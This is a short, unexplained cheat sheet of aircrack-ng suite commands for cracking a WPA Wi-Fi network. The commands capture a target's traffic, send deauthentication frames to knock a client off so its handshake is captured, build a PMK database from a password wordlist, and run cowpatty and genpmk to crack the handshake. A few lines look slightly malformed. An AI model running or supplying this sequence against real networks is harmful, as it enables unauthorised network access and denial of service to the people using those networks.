airodump-ng --channel 6
airodump-ng --channel 6 --write output --bssid bssidVal wlan0mon
aireplay-ng --deauth 6 -a bssidVal -c stationVal wlan0mon
airolib-ng crackwpa --import password /root/passwords.txt
airolib-ng crackwpa -import essid essid
airolib-ng crackwpa --stats
airolib-ng crackwpa --clean all
airolib-ng crackwpa --batch
airolib-ng crackwpa --verify all

cowpatty -s Denial_of_Service -r /root/output-01.cap -f /root/passwords.txt
genpmk -s Denial_of_Service -d /root/output-01.cap -f /root/passwords.txt